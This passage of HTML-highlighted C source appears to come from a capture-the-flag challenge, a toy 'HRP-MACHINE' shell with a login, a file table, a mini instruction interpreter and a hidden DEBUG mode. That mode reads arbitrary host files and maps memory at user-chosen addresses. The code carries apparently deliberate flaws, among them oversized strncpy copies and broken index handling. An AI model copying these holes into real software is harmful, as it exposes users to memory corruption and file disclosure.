░░ ░░      ░░░ ░░░░░░░░\n&quot;</span>;</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner1,<span class="built_in">strlen</span>(banner1));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner2,<span class="built_in">strlen</span>(banner2));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner3,<span class="built_in">strlen</span>(banner3));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner4,<span class="built_in">strlen</span>(banner4));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner5,<span class="built_in">strlen</span>(banner5));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner6,<span class="built_in">strlen</span>(banner6));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner7,<span class="built_in">strlen</span>(banner7));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner8,<span class="built_in">strlen</span>(banner8));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">login_system</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  write_HRP(<span class="number">1</span>,<span class="string">&quot;USER NAME:\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;USER NAME:\n&quot;</span>));</span><br><span class="line">  <span class="type">char</span> name[<span class="number">0x30</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%48s[^\n ]&quot;</span>,name);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="type">char</span> pass[<span class="number">0x30</span>];</span><br><span class="line">  write_HRP(<span class="number">1</span>,<span class="string">&quot;PASSWORD:\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;PASSWORD:\n&quot;</span>));</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%48s[^\n ]&quot;</span>,pass);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,username))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(pass,password))</span><br><span class="line">      &#123;</span><br><span class="line">        login_if=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        write_HRP(<span class="number">1</span>,<span class="string">&quot;password error\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;password error\n&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      write_HRP(<span class="number">1</span>,<span class="string">&quot;username error\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;username error\n&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  users.uid=<span class="number">1000</span>;</span><br><span class="line">  users.gid=<span class="number">1000</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;[+]HOLDER:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,users.holder,<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">clearScreen</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[1;1H\e[2J&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">check_repeat</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;  </span><br><span class="line">      write_HRP(<span class="number">1</span>,<span class="string">&quot;FILE HAD!\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;FILE HAD!\n&quot;</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      ;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">check_repeat_reboot</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      ;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">create_file</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> check=check_repeat(name);</span><br><span class="line">  <span class="keyword">if</span>(!check)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  HF[file_count].fd=global_fd;</span><br><span class="line">  HF[file_count].filename=name;</span><br><span class="line">  HF[file_count].mod=<span class="number">1000</span>;</span><br><span class="line">  HF[file_count].file_content=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;FILE CONTENT: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,HF[file_count].file_content,<span class="number">0x1000</span>);</span><br><span class="line">  deleEnter(HF[file_count].file_content);</span><br><span class="line">  file_count++;</span><br><span class="line">  global_fd++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ls</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>,HF[i].filename);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">deleEnter</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *tmp = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">if</span> ((tmp = <span class="built_in">strstr</span>(name, <span class="string">&quot;\n&quot;</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">       *tmp = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cat</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="keyword">if</span>(HF[i].mod==<span class="number">1001</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,HF[i].file_content);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s%s%s\n&quot;</span>,<span class="string">&quot;cat: &quot;</span>,name,<span class="string">&quot;: Permission denied&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> vm_elf(<span class="type">char</span> *name)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> tmp_cmd[<span class="number">0x100</span>][<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">  <span class="type">char</span> *exec;</span><br><span class="line">  <span class="type">char</span> tmp_file_content[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(tmp_file_content,HF[i].file_content,<span class="number">0x1000</span>);</span><br><span class="line">      exec = strtok(tmp_file_content, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span>( exec != <span class="literal">NULL</span> ) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(tmp_cmd[count],exec,<span class="number">0x10</span>);</span><br><span class="line">        count++;</span><br><span class="line">        exec = strtok(<span class="literal">NULL</span>, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> IS[<span class="number">0x100</span>][<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> *exec_IS;</span><br><span class="line">  <span class="type">int</span> count_IS=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(tmp_file_content,tmp_cmd[i],<span class="number">0x1000</span>);</span><br><span class="line">    exec_IS = strtok(tmp_file_content, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>( exec_IS != <span class="literal">NULL</span> ) </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">strncpy</span>(IS[count_IS],exec_IS,<span class="number">0x10</span>);</span><br><span class="line">      exec_IS = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">      count_IS++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> obj[<span class="number">0x100</span>][<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> *exec_obj;</span><br><span class="line">  <span class="type">int</span> count_obj=<span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;count_IS;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">2</span>!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(tmp_file_content,IS[i],<span class="number">0x1000</span>);</span><br><span class="line">      exec_obj = strtok(tmp_file_content, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span>( exec_obj != <span class="literal">NULL</span> ) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(obj[count_obj],exec_obj,<span class="number">0x10</span>);</span><br><span class="line">        exec_obj = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        count_obj++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> index=<span class="number">1000</span>;</span><br><span class="line">  <span class="type">int</span> a,b;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;count_obj;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(IS[i],<span class="string">&quot;mov&quot;</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        index=MOV;</span><br><span class="line">        <span class="keyword">goto</span> is;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        index=<span class="number">1000</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(IS[i],<span class="string">&quot;call&quot;</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        index=CALL;</span><br><span class="line">        <span class="keyword">goto</span> is;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        index=<span class="number">1000</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">is:    <span class="keyword">switch</span>(index)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> MOV:</span><br><span class="line">          a=atoi(obj[i]);</span><br><span class="line">          b=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">if</span>((a&amp;&amp;b))</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>(a)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;rdi&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RDI]=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;rsi&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RSI]=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;rdx&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RDX]=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;rax&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RAX]=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> CALL:</span><br><span class="line">          a=atoi(obj[i]);</span><br><span class="line">          b=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">if</span>((a))</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>(!b)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;open&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RAX]=b;</span><br><span class="line">              <span class="keyword">if</span>(REG[RAX]==<span class="number">2</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                </span><br><span class="line">                HRP_OPEN(REG[RDI],REG[RSI]);</span><br><span class="line">              &#125;</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;write&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RAX]=b;</span><br><span class="line">              <span class="keyword">if</span>(REG[RAX]==<span class="number">1</span>)</span><br><span class="line">              &#123;  </span><br><span class="line">                HRP_WRITE(REG[RDI],REG[RSI],REG[RDX]);</span><br><span class="line">              &#125;</span><br><span class="line">              </span><br><span class="line">            &#125;  </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:<span class="built_in">puts</span>(<span class="string">&quot;INVAID IS!&quot;</span>);<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HRP_WRITE</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> buf,<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(buf==HF[i].fd)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(HF[i].mod!=<span class="number">1001</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;MOD CAN WRITE&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        write(fd,HF[i].file_content,size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HRP_OPEN</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> mod)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(fd==HF[i].fd)</span><br><span class="line">    &#123;</span><br><span class="line">      HF[i].mod=mod;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  clearScreen();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;NOT FOUND,PLEASE NEW FILE&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;FILE NAME: &quot;</span>);</span><br><span class="line">  <span class="type">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%16s[^\n ]&quot;</span>,name);</span><br><span class="line">  getchar();</span><br><span class="line">  deleEnter(name);</span><br><span class="line">  create_file(name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *debug_cmd[]=&#123;<span class="string">&quot;id\x00&quot;</span>,<span class="string">&quot;file input\x00&quot;</span>,<span class="string">&quot;file out\x00&quot;</span>,<span class="string">&quot;exit\x00&quot;</span>,<span class="string">&quot;mmap\x00&quot;</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">charge_file</span><span class="params">(<span class="type">char</span> *op)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(op,<span class="string">&quot;file input&quot;</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;FILE NAME:&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *name=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x1000</span>];</span><br><span class="line">    read(<span class="number">0</span>,name,<span class="number">0x20</span>);</span><br><span class="line">    deleEnter(name);</span><br><span class="line">    FILE * fp1 = fopen(name, <span class="string">&quot;ab+&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (fp1==<span class="literal">NULL</span>) &#123;<span class="comment">//若打开文件失败则退出</span></span><br><span class="line">          perror(fopen);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;<span class="built_in">fscanf</span>(fp1,<span class="string">&quot;%c&quot;</span>,a+i)!=EOF;i++);</span><br><span class="line">      fclose(fp1);<span class="comment">//关闭输入文件</span></span><br><span class="line">    </span><br><span class="line">    HF[file_count].fd=global_fd;</span><br><span class="line">    HF[file_count].filename=name;</span><br><span class="line">    HF[file_count].mod=<span class="number">1000</span>;</span><br><span class="line">    HF[file_count].file_content=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strncpy</span>(HF[file_count].file_content,a,<span class="number">0x1000</span>);</span><br><span class="line">    file_count++;</span><br><span class="line">    global_fd++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(op,<span class="string">&quot;file out&quot;</span>))</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> DEBUG()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]DEBUGING&quot;</span>);</span><br><span class="line">  <span class="type">char</span> choice[<span class="number">0x20</span>];</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;[+][DEBUGING]root# &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,choice,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">0</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">0</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;uid=%d  gid=%d\n&quot;</span>,users.uid,users.gid );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">1</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">1</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      deleEnter(choice);</span><br><span class="line">      charge_file(choice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">2</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">2</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      deleEnter(choice);</span><br><span class="line">      charge_file(choice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">3</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">3</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      deleEnter(choice);</span><br><span class="line">      users.gid=<span class="number">1000</span>;</span><br><span class="line">      users.uid=<span class="number">1000</span>;</span><br><span class="line">      <span class="built_in">strncpy</span>(users.holder,<span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>,<span class="number">8</span>);</span><br><span class="line">      machine_start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(debug_cmd[<span class="number">4</span>],choice,<span class="built_in">strlen</span>(debug_cmd[<span class="number">4</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr=<span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;addr);</span><br><span class="line">      mmap((<span class="type">void</span> *)addr, <span class="number">1024LL</span>, PROT_READ|PROT_WRITE, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rm</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;  </span><br><span class="line">      </span><br><span class="line">      HF[file_count].fd=<span class="literal">NULL</span>;</span><br><span class="line">      HF[file_count].filename=<span class="literal">NULL</span>;</span><br><span class="line">      HF[file_count].mod=<span class="number">1000</span>;</span><br><span class="line">      HF[file_count].file_content=<span class="literal">NULL</span>;</span><br><span class="line">      file_count--;</span><br><span class="line">      global_fd--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *system_cmd[]=&#123;<span class="string">&quot;ls\x00&quot;</span>,<span class="string">&quot;id\x00&quot;</span>,<span class="string">&quot;file\x00&quot;</span>,<span class="string">&quot;cat\x00&quot;</span>,<span class="string">&quot;./\x00&quot;</span>,<span class="string">&quot;reg\x00&quot;</span>,<span class="string">&quot;DEBUG\x00&quot;</span>,<span class="string">&quot;reboot\x00&quot;</span>,<span class="string">&quot;shutdown\x00&quot;</span>,<span class="string">&quot;rm\x00&quot;</span>&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">machine_start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *tmp;</span><br><span class="line">  tmp=(<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    write_HRP(<span class="number">1</span>,<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;HRP-MACHINE$ &quot;</span>));</span><br><span class="line">    read(<span class="number">0</span>,tmp,<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">0</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">0</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      ls();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">1</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">1</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;uid=%d  gid=%d\n&quot;</span>,users.uid,users.gid );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">2</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">2</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      clearScreen();</span><br><span class="line">      <span class="type">char</span> *name=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;FILE NAME: &quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%16s[^\n ]&quot;</span>,name);</span><br><span class="line">      getchar();</span><br><span class="line">      deleEnter(name);</span><br><span class="line">      create_file(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">3</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">3</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *exec;</span><br><span class="line">         exec = strtok(tmp, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         exec = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">         deleEnter(exec);</span><br><span class="line">         cat(exec);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(system_cmd[<span class="number">4</span>],tmp,<span class="built_in">strlen</span>(system_cmd[<span class="number">4</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *exec;</span><br><span class="line">         exec = strtok(tmp, <span class="string">&quot;./&quot;</span>);</span><br><span class="line">         deleEnter(exec);</span><br><span class="line">         